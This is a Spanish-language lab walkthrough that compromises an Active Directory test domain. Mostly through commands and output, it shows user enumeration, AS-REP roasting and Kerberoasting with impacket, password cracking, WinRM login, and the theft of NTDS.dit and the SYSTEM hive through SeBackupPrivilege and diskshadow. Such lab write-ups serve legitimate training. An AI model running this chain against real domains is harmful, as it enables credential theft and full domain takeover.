---
title: Active Directory Lab
published: true
---

---

Laboratorio de [-](https://) 

### Enumeración

Con **nmap** escaneo puertos abiertos para detectar el servicio y la versión de cada uno.

```ruby
❯ sudo nmap -sCV -p- --open -T 5 -n -Pn 192.168.1.19
[sudo] password for kali: 
Nmap scan report for 192.168.1.19
Host is up (0.0068s latency).
Not shown: 65511 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: login page
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
81/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-28 21:39:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: examen.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: login page
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2024-09-28T21:40:55+00:00; -1h01m41s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=WIN-442P9GU13EM
| Not valid before: 2022-11-02T12:56:14
|_Not valid after:  2023-05-04T12:56:14
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: EXAMEN)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: examen.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXAMEN
|   NetBIOS_Domain_Name: EXAMEN
|   NetBIOS_Computer_Name: WIN-442P9GU13EM
|   DNS_Domain_Name: examen.local
|   DNS_Computer_Name: WIN-442P9GU13EM.examen.local
|   Product_Version: 10.0.14393
|_  System_Time: 2024-09-28T21:40:15+00:00
| ssl-cert: Subject: commonName=WIN-442P9GU13EM.examen.local
| Not valid before: 2024-09-23T16:14:46
|_Not valid after:  2025-03-25T16:14:46
|_ssl-date: 2024-09-28T21:40:55+00:00; -1h01m41s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
52764/tcp open  msrpc         Microsoft Windows RPC
58140/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:98:1A:5D (VMware)
Service Info: Host: WIN-442P9GU13EM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-28T21:40:15
|_  start_date: 2024-09-28T21:18:57
|_nbstat: NetBIOS name: WIN-442P9GU13EM, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:98:1a:5d (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -1h21m41s, deviation: 48m59s, median: -1h01m42s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: WIN-442P9GU13EM
|   NetBIOS computer name: WIN-442P9GU13EM\x00
|   Domain name: examen.local
|   Forest name: examen.local
|   FQDN: WIN-442P9GU13EM.examen.local
|_  System time: 2024-09-28T23:40:15+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Nmap done: 1 IP address (1 host up) scanned in 154.64 seconds
```

Empezando con los puertos **HTTP**, en el puerto 80 hay una copia de el sitio [vulnweb](http://testphp.vulnweb.com/login.php) de Acunetix, diseñada para realizar pruebas de seguridad.

![](https://eidd3.github.io/assets/img/ActiveDirectoryLab/80.png)

En el puerto 81, una página con tres rutas.

![](https://eidd3.github.io/assets/img/ActiveDirectoryLab/81.png)

En el directorio **_/estudio_** y **_/examen_** poco contenido interesante, pero en el directorio **_/ifp_** hay un mensaje con una lista de usuarios.

```
¿Que hace el protocolo SMB? ¿Recursos compartidos? ¿Carpetas?

daniel
luis
ignacio
lloel
putin
sergio
julian
joan
```

Guardo esa lista en un archivo.

Con esa lista podría probar enumerar posibles usuarios con la herramienta **Kerbrute** en el servicio kerberos que está corriendo en el puerto **88**.
Pero antes enumero un poco más el sistema con **crackmapexec**.

```ruby
❯ crackmapexec smb 192.168.1.19
SMB         192.168.1.19    445    WIN-442P9GU13EM  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-442P9GU13EM) (domain:examen.local) (signing:True) (SMBv1:True)
```

Veo información como el nombre del host: **WIN-442P9GU13EM**, la versión del sistema operativo del servidor: **Windows Server 2016 Standard Evaluation 14393 x64**, y el nombre del dominio al que pertenece el host: **examen.local**.

Agrego el nombre del dominio a mi archivo _/etc/hosts_ 

```bash
❯ echo "192.168.1.19 examen.local" | sudo tee -a /etc/hosts
192.168.1.19 examen.local
❯ cat /etc/hosts
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ ::1     localhost ip6-localhost ip6-loopback
   4   │ ff02::1     ip6-allnodes
   5   │ ff02::2     ip6-allrouters
   6   │ 
   7   │ 192.168.1.19 examen.local
```

Ahora sí, con **Kerbrute** enumero usuarios válidos de la lista que aparecía en **http://192.168.1.19:81/ifp/**.

```ruby
❯ /opt/kerbrute userenum -d examen.local --dc 192.168.1.19 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/29/24 - Ronnie Flathers @ropnop

2024/09/29 02:43:59 >  Using KDC(s):
2024/09/29 02:43:59 >  	192.168.1.19:88

2024/09/29 02:43:59 >  [+] VALID USERNAME:	julian@examen.local
2024/09/29 02:43:59 >  Done! Tested 8 usernames (1 valid) in 0.242 seconds
```

El usuario `julian` es válido, pero **Kerbrute** no dumpea el hash **TGT** así que para asegurarme uso **impacket-GetNPUsers**.

```ruby
❯ impacket-GetNPUsers examen.local/ -no-pass -usersfile users.txt
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User julian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Pero tampoco reporta nada.

Si trato de enumerar el servicio **SMB** no puedo acceder a ningún recurso, tampoco usando un null session.

```ruby
❯ smbmap -H 192.168.1.19  --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[!] Connection error on 192.168.1.19                                                                                         
[*] Established 0 SMB connections(s) and 0 authenticated session(s)
[*] Closed 0 connections
```

Por lo que vuelvo a enumerar un poco más la página web del puerto 81.

```java
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.1.19:81/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.19:81/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Articles             (Status: 301) [Size: 166] [--> http://192.168.1.19:81/Articles/]
/Blog                 (Status: 301) [Size: 162] [--> http://192.168.1.19:81/Blog/]
/Global               (Status: 301) [Size: 164] [--> http://192.168.1.19:81/Global/]
/Services             (Status: 301) [Size: 166] [--> http://192.168.1.19:81/Services/]
/articles             (Status: 301) [Size: 166] [--> http://192.168.1.19:81/articles/]
/blog                 (Status: 301) [Size: 162] [--> http://192.168.1.19:81/blog/]
/email                (Status: 301) [Size: 163] [--> http://192.168.1.19:81/email/]
/global               (Status: 301) [Size: 164] [--> http://192.168.1.19:81/global/]
/index.html           (Status: 200) [Size: 70]
/profile              (Status: 301) [Size: 165] [--> http://192.168.1.19:81/profile/]
/services             (Status: 301) [Size: 166] [--> http://192.168.1.19:81/services/]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

Hay directorios interesantes como _email_ y _profile_.
Vuelvo a ejecutar **gobuster** en el directorio _profile_.

```ruby
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.1.19:81/profile
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.19:81/profile
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

Pero no encuentra nada, así que agrego algunas extensiones de archivos para ver si existe algún archivo.

```ruby
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.1.19:81/profile -x txt,gz,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.19:81/profile
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users.txt            (Status: 200) [Size: 27]
Progress: 18908 / 18908 (100.00%)
===============================================================
Finished
===============================================================
```

Y el archivo tiene unos nuevos usuarios que agrego al archivo con los otros nombres.

![](https://eidd3.github.io/assets/img/ActiveDirectoryLab/users.png)


Ahora intento otro _userenum_ con **Kerbrute**.

```ruby
❯ /opt/kerbrute userenum -d examen.local --dc 192.168.1.19 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/29/24 - Ronnie Flathers @ropnop

2024/09/29 04:09:10 >  Using KDC(s):
2024/09/29 04:09:10 >  	192.168.1.19:88

2024/09/29 04:09:10 >  [+] VALID USERNAME:	guille@examen.local
2024/09/29 04:09:10 >  [+] VALID USERNAME:	julian@examen.local
2024/09/29 04:09:10 >  [+] VALID USERNAME:	ifp_asrep@examen.local
2024/09/29 04:09:10 >  Done! Tested 10 usernames (3 valid) in 0.425 seconds
```

Y **2** nuevos usuarios válidos aparecen, `guille` y `ifp_asrep`.

Vuelvo a ejecutar un ataque _ASREProast_ con **impacket-GetNPUsers** para tratar de extraer algún hash **TGT**.

```ruby
❯ impacket-GetNPUsers examen.local/ -no-pass -usersfile users.txt
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User julian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$ifp_asrep@EXAMEN.LOCAL:e2c22c1a2c6619532cd32ec630c1faf3$55f1a66f4c51fd79aac7720433669498bcfaa9f96f40064f9723a43f658de7ace2d9a49e44f7fb44d4721cf9b30b1e53793d7e7b882d8d2f6b4bc07ab8d4d7f6533307bd55ee9a5bacb3e1d49c1afde35b4f21446b4e929fbbe8fb6707fc789c8411616b10e1789f15660125290f8443cde12668ee2aeda68ea0f44b28318ed0a103ce66d8ecd92ebfe9d355a2332338fb0c183b4ac7298625ef9bf521de4c1b79b9edbbdb46b9f415d5dbac8eb85b9899df529ab9726d5ab7833609b1b989bd64927072712147e820177ffc284fb8bf43a0665ef3013db3e8307c6704fd7be5c7f2320008c1912f2a4f4542
[-] User guille doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Y el usuario `ifp_asrep` es vulnerable, está configurado con la preautenticación deshabilitada por lo que al solicitar un **TGT** en nombre de este usuario al **KDC**, este responde con un AS-REP que incluye el **TGT** y una parte cifrada, **EncryptedPart**, que contiene información del ticket y que está cifrada con una clave derivada de la contraseña del usuario.

Ahora esta _informacion cifrada_ o hash, es el que con fuerza bruta de manera local trato de romper para obtener la contraseña de `ifp_asrep`.

```ruby
❯ john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        ($krb5asrep$23$ifp_asrep@EXAMEN.LOCAL)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Ahora tengo unas credenciales, `ifp_asrep:Password1`.

Para enumerar un poco más uso **ldapdomaindump** para obtener información sobre los usuarios del dominio, a lo mejor alguna descripción tiene data interesante como contraseñas temporales o algo más, nunca se sabe.

```ruby
❯ ldapdomaindump -u 'examen.local\ifp_asrep' -p 'Password1' 192.168.1.19
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Ahora, con estos archivos inicio un servidor en mi puerto 80 con python para ver la información detallada.

```C
domain_computers_by_os.html  domain_computers.json  domain_groups.json  domain_policy.json  domain_trusts.json          domain_users.html
domain_computers.grep        domain_groups.grep     domain_policy.grep  domain_trusts.grep  domain_users_by_group.html  domain_users.json
domain_computers.html        domain_groups.html     domain_policy.html  domain_trusts.html  domain_users.grep
```

![](https://eidd3.github.io/assets/img/ActiveDirectoryLab/ldap.png)

Y el usuario **SVC_SQL** pertenece a varios grupos, entre ellos el **Windows Remote Management** que me permitiría ejecutar comandos en el sistema, por lo que sería interesante convertirme a ese usuario. Pero para eso hay que seguir probando cosas.

Con un usuario y contraseña válidos, se puede llevar a cabo un ataque **Kerberoasting**, que consiste en buscar y listar todos los  **SPN (Service Principal Name)** asociados a cuentas de servicios en el dominio, y obtener los **TGS** correspondientes. Estos **TGS** están cifrados con la contraseña de la cuenta de servicio, lo que permite intentar descifrarla.

```ruby
❯ impacket-GetUserSPNs examen.local/ifp_asrep:Password1
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName             Name     MemberOf                                                                      PasswordLastSet             LastLogon                   Delegation 
-------------------------------  -------  ----------------------------------------------------------------------------  --------------------------  --------------------------  ----------
examen.local/SCV_SQL.DC-Company  SVC_SQL  CN=Grupo de acceso de autorizaciÃ³n de Windows,CN=Builtin,DC=examen,DC=local  2022-11-03 13:38:52.879679  2024-09-25 20:10:12.131627            	
```

Y encuentra el **SPN** de un servicio **SQL** que se está ejecutando con el nombre de la cuenta de servicio asociada **SVC_SQL**. Ahora con el parámetro _-request_ veo si extrae el **TGS** para poder descifrarlo.


```ruby
❯ impacket-GetUserSPNs examen.local/ifp_asrep:Password1 -request
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName             Name     MemberOf                                                                      PasswordLastSet             LastLogon                   Delegation 
-------------------------------  -------  ----------------------------------------------------------------------------  --------------------------  --------------------------  ----------
examen.local/SCV_SQL.DC-Company  SVC_SQL  CN=Grupo de acceso de autorizaciÃ³n de Windows,CN=Builtin,DC=examen,DC=local  2022-11-03 13:38:52.879679  2024-09-25 20:10:12.131627             



[-] CCache file is not found. Skipping...
[-] Principal: examen.local\SVC_SQL - Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
Pero aparece el error **Clock skew too great**, esto se debe a que existe una diferencia entre el **DC** y el cliente que intenta comunicarse a él. Para solucionar esto hay que sincronizar mi reloj al mismo que el del **AD**.

Mi reloj y la del **AD** tiene una diferencia de varios minutos.

```ruby
❯ date
Mon Sep 30 08:38:48 PM GMT 2024
❯ curl -s -X GET "http://192.168.1.19:81" -I | grep -i date
Date: Mon, 30 Sep 2024 19:37:13 GMT
```

```ruby
❯ sudo date --set="$(curl -s X GET "http://192.168.1.19:81" -I | grep -i date | sed 's/Date: //I')"
Mon Sep 30 07:41:39 PM GMT 2024
❯ date
Mon Sep 30 07:41:42 PM GMT 2024
❯ curl -s -X GET "http://192.168.1.19:81" -I | grep -i date
Date: Mon, 30 Sep 2024 19:41:47 GMT
```

```ruby
❯ impacket-GetUserSPNs examen.local/ifp_asrep:Password1 -request
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName             Name     MemberOf                                                                      PasswordLastSet             LastLogon                   Delegation 
-------------------------------  -------  ----------------------------------------------------------------------------  --------------------------  --------------------------  ----------
examen.local/SCV_SQL.DC-Company  SVC_SQL  CN=Grupo de acceso de autorizaciÃ³n de Windows,CN=Builtin,DC=examen,DC=local  2022-11-03 13:38:52.879679  2024-09-25 20:10:12.131627             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SVC_SQL$EXAMEN.LOCAL$examen.local/SVC_SQL*$2d56bf3ff2c1112a19fbfd7cb00a59de$64b7fd5cc3314726c7563dda2c814a20051b49e4e030bd6fdda893a21be1fa068a8a50d5c8d0dd19967863e74f793323da7f6b536d944164b8e4e7b307d33e0d09ac52a3b03c14eb06bdd481b9367258d653578dcbe306cf8b242ba29f2426dceb9efb2a48b4628b847c60fbe12097d6105335c0f83ef436ae9a8dfba916550af146f006baa9bad64f563db3765b1b790427681aae79792e6a18cf36251e1c5839a54eaaeabc4cd78f8fa1001b01560132aa5ca6bb18c499dc75839ebbd49f0d64a128f16bef41a8657b2c269f1a9e0e884adb95ffd0704db9733e32949a5b259d70a048d3dda37f3907d130c0d74aa153a32351c74c1c75d4b19457a63ea7a9069ccded606b98a098326ce93871ff4bd9bd0be26f6700a6e86d370f83f890646ccd8754ca73776e85333ae55c58e96ee250f303d30370099001cbafd783d2fd81bd5994fb32c4df614c091b3a0afd962d50184b36ea2f58c51834b607600c42d061eea0bdcbc458a5c8edfc3dfe6cfa217e76abc619699174b936811a4c6070ecb44789fb59ee4ed2e4555d6eb356bc70f48816f6af2124cd7386d2fa25c4b687528314a2615e65fb498859466d4d1729b4bf3cc618c4aa5e8483e3d4496679b14f26881e9bcf164cf08c342b42cb9a8367401dcf0f3ca762e87c523807a289ee11a3e512c8cf8cb42a1371a6858693241882e16d365a599cf1e70cda9602e11e53654590d5a35033f364ce0fc97bf0bd2fa38491342ad7436bd1142055427d5c47a1ccfbb3c64320c9f020e5a06a574f8a72686bb2179df4feb42fd6a48c0b2aa27dc7db7f0ee454a7be96b856212e3c526dbbdb30e7c8f16dbe621d19ff289c3826e19a75c27485881ff6b583a58afc43e40637464ccc1953a17a07c989fe5a20caa67ffa7aea3d8ac8efc94dc9eb4a91beb71292f36b7cf2ccd44553e87b42b8c6db18797d4dae0862ad3b24b7a929eae894ea1f489ddd12caada6f7d8c03db3737561efdb8c2fda59a73684e4acd0d6bd9e92bd1c602874e176b216cb9ed5a96607e0f9d4141299daa1b67eee8d4edcd51c5b9dff0236fced2c662f458175f2631e2ab525900d67693d3a4628dff922ab642e57db5f85e3a0e1edd931c099805ea12c6829d8c303a998e774adb6132419b8da7782d6dfdf0cf62ae0a63a755b1be57d2f97d985b12a9572d42918308ec445d0763aa170c6590aed4a2b1cf612b4d5389504013ab0951658f4d8cbb970000d6da24ded6c85876ea531c99cd09c779774f15b6af0a97f5010a11095fffc491cdbb7735a7e254a0f79ff93d22de15d868c04d89c101b16bd342128d077f67da1b45f9285949d7be1288ad39af831b1f20f7713bc2f5919a286f8
```

Con este nuevo hash vuelvo a aplicar fuerza bruta para descifrarlo.

```ruby
❯ john -w=/usr/share/wordlists/rockyou.txt hash2
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password!        (?)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nuevas credenciales `SVC_SQL:Password!`.

Con **crackmapexec** las valido.

```ruby
❯ crackmapexec smb 192.168.1.19 -u 'SVC_SQL' -p 'Password!'
SMB         192.168.1.19    445    WIN-442P9GU13EM  [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:WIN-442P9GU13EM) (domain:examen.local) (signing:True) (SMBv1:True)
SMB         192.168.1.19    445    WIN-442P9GU13EM  [+] examen.local\SVC_SQL:Password! 
```

Ahora que tengo las credendiales del usuario **SVC_SQL** y la información de antes sabiendo que pertenece al grupo **Windows Remote Management** pruebo con el servicio de **WinRM** y da resultado exitoso, por lo que puedo conectarme usuando este servicio.

```ruby
❯ crackmapexec winrm 192.168.1.19 -u 'SVC_SQL' -p 'Password!'
SMB         192.168.1.19    5985   WIN-442P9GU13EM  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-442P9GU13EM) (domain:examen.local)
HTTP        192.168.1.19    5985   WIN-442P9GU13EM  [*] http://192.168.1.19:5985/wsman
WINRM       192.168.1.19    5985   WIN-442P9GU13EM  [+] examen.local\SVC_SQL:Password! (Pwn3d!)
```

```ruby
❯ evil-winrm -i 192.168.1.19 -u 'SVC_SQL' -p 'Password!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\SVC_SQL\Documents> whoami
examen\svc_sql
```

Si enumero la información de grupos y privilegios para este usuario veo que tiene los privilegios **SeBackupPrivilege, SeRestorePrivilege** y pertenece al grupo **Operadores de copia de seguridad**.

Si buscamos información sobre estos privilegios veo que se puede llegar a escalar privilegios creando una copia de seguridad de todo el sistema, incluyendo información sensible como la **SAM (Security Account Manager)** y el **NTDS.dit (NT Directory Services. Directory Information Tree)**.

Para resumir digamos que la **SAM** y el archivo **NTDS.dit** son una base de datos de un equipo local y un **Active Directory**.

Con estos elementos, más el archivo _system_ se podrían extraer los hash para descifrarlos en local o efectuar un **Pass The Hash**.

Para empezar hay que crear una copia del sistema para despues poder copiar el **NTDS.dit** ya que si está en uso no se puede interactuar con él.

Para este proceso uso _diskshadow_, la idea es crear un script de exfiltración para primeramente crear una copia del volumen del sistema **C:** y montarlo en la nueva unidad **Z:**, para después poder interactuar con el archivo **NTDS.dit** y poder crear una copia.


```
❯ cat script.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: script.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ set context persistent nowriters 
   2   │ add volume c: alias diskTest 
   3   │ create 
   4   │ expose %diskTest% z: 
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```java
*Evil-WinRM* PS C:\Temp> upload /home/kali/Desktop/AD/exploit/script.txt
                                        
Info: Uploading /home/kali/Desktop/AD/exploit/script.txt to C:\Temp\script.txt
                                        
Data: 124 bytes of 124 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Temp> ls


    Directorio: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/1/2024   9:04 PM             94 script.txt

```

```java
*Evil-WinRM* PS C:\Temp> diskshadow /s c:/Temp/script.txt
Microsoft DiskShadow versi¢n 1.0
Copyright (C) 2013 Microsoft Corporation
En el equipo: WIN-442P9GU13EM

-> set context persistent nowriters
-> add volume c: alias diskTest
-> create
Se estableci¢ el alias diskTest para el identificador de instant nea {50164942-e049-49d7-b3ae-1d03ce259fac} como
variable de entorno.
Se estableci¢ el alias VSS_SHADOW_SET para el identificador de conjunto de
instant neas {65fe02c4-8afd-4211-ae01-6c62868c0772} como variable de entorno.

Consultando todas las instant neas con el identificador de conjunto de instant neas {65fe02c4-8afd-4211-ae01-6c62868c0772}

	* Identificador de instant nea = {50164942-e049-49d7-b3ae-1d03ce259fac}		%diskTest%
		- Conjunto de instant neas: {65fe02c4-8afd-4211-ae01-6c62868c0772}	%VSS_SHADOW_SET%
		- N£mero original de instant neas = 1
		- Nombre de volumen original: \\?\Volume{888e7c09-0000-0000-0000-501f00000000}\ [C:\]
		- Nombre de dispositivo de instant nea: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
		- Equipo de origen: WIN-442P9GU13EM.examen.local
		- Equipo de servicio: WIN-442P9GU13EM.examen.local
		- No expuesto
		- Identificador de proveedor: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Atributos:  No_Auto_Release Persistent No_Writers Differential

N£mero de instant neas enumeradas: 1
-> expose %diskTest% e:
-> %diskTest% = {50164942-e049-49d7-b3ae-1d03ce259fac}
Se expuso correctamente la instant nea como e:\.
->
```

Ahora si listo la unidad es lo mismo que lo que hay en el disco **C:**.

```java
*Evil-WinRM* PS e:\> dir


    Directory: e:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/12/2023   1:36 PM                Datos
d-----        11/3/2022   3:00 PM                inetpub
d-----        5/12/2023  11:44 AM                Perfiles
d-----        7/16/2016   3:23 PM                PerfLogs
d-r---        11/3/2022   1:48 PM                Program Files
d-----        7/16/2016   3:23 PM                Program Files (x86)
d-----        10/1/2024   9:12 PM                Temp
d-r---        11/4/2022   9:09 AM                Users
d-----        5/12/2023   1:07 PM                Vuln Service
d-----        5/12/2023  11:07 AM                Windows
```

Con la copia creada hay que descargar los archivos, el registro _system_ y el **NTDS.dit**.

```java
*Evil-WinRM* PS C:\Temp> reg save HKLM\system system
La operaci¢n se complet¢ correctamente.

*Evil-WinRM* PS C:\Temp> dir


    Directorio: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/1/2024   9:12 PM             94 script.txt
-a----        10/1/2024   9:36 PM       14172160 system
```

```java
*Evil-WinRM* PS C:\Temp> copy z:\Windows\NTDS\ntds.dit ntds.dit
Access to the path 'Z:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ copy z:\Windows\NTDS\ntds.dit ntds.dit
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (Z:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```
Pero dice _'acceso no autorizado'_, y aca es donde se abusa del permiso _SeBackupPrivilege_ para poder usar **robocopy** y crear la copia.

```java
*Evil-WinRM* PS C:\Temp> robocopy  /b z:\Windows\NTDS\ . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Herramienta para copia eficaz de archivos
-------------------------------------------------------------------------------

   Origen : z:\Windows\NTDS\
     Destino : C:\Temp\

    Archivos: ntds.dit

  Opciones: /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	z:\Windows\NTDS\
	   Nuevo arch		 20.0 m	ntds.dit
  0.0%
